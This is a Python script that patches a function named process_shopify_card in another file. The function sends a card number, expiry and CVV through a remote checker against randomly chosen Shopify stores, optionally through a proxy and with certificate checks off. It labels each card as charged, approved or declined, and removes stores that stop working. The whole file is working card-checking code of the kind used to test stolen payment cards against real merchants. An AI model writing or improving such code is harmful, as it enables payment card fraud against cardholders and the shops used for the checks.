import re

with open('sh.py', 'r') as f:
    content = f.read()

# Fix process_shopify_card - check Response BEFORE Status
new_func = '''async def process_shopify_card(cc, mm, yy, cvv, site=None, proxy=None):
    start = time.time()
    try:
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        if not site:
            sites = load_sites()
            site = random.choice(sites) if sites else "https://myfetaldoppler.com"
        
        params = {"cc": formatted_cc, "site": site}
        if proxy:
            params["proxy"] = proxy
        
        resp = requests.get(SHOPIFY_API, params=params, timeout=60, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            elapsed = f"{time.time() - start:.2f}s"
            gateway = data.get('Gateway', 'Shopify Payments')
            price = data.get('Price', '0.00')
            raw_response = data.get('Response', 'Unknown')
            status_field = data.get('Status', False)
            
            detected_status = get_response_status(raw_response)
            
            # CHECK RESPONSE FIRST - if it's CARD_DECLINED, it's DECLINED
            if detected_status == "DECLINED":
                return {
                    "approved": False,
                    "message": f"{raw_response} ❌",
                    "status": "DECLINED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            
            # THEN check if Status is True
            if status_field:
                return {
                    "approved": True,
                    "message": f"{raw_response} ✅",
                    "status": "CHARGED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            
            if detected_status == "APPROVED":
                return {
                    "approved": True,
                    "message": f"{raw_response} ✅",
                    "status": "APPROVED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            elif "site not supported" in raw_response.lower():
                remove_dead_site(site)
                return {
                    "approved": False,
                    "message": "Site removed",
                    "status": "ERROR",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
            else:
                return {
                    "approved": False,
                    "message": f"{raw_response} ❌",
                    "status": "DECLINED",
                    "gateway": gateway,
                    "price": price,
                    "site": site,
                    "proxy": proxy or "None",
                    "time": elapsed
                }
        else:
            remove_dead_site(site)
            elapsed = f"{time.time() - start:.2f}s"
            return {
                "approved": False,
                "message": f"API Error: {resp.status_code}",
                "status": "ERROR",
                "gateway": "Shopify",
                "price": "0.00",
                "site": site,
                "proxy": proxy or "None",
                "time": elapsed
            }
    except Exception as e:
        elapsed = f"{time.time() - start:.2f}s"
        return {
            "approved": False,
            "message": str(e)[:100],
            "status": "ERROR",
            "gateway": "Shopify",
            "price": "0.00",
            "site": site or "N/A",
            "proxy": proxy or "None",
            "time": elapsed
        }'''

# Find and replace the function
pattern = r'async def process_shopify_card\(cc, mm, yy, cvv, site=None, proxy=None\).*?(?=\n\S|\Z)'
content = re.sub(pattern, new_func, content, flags=re.DOTALL)

with open('sh.py', 'w') as f:
    f.write(content)

print("✅ sh.py fixed: Response checked before Status")
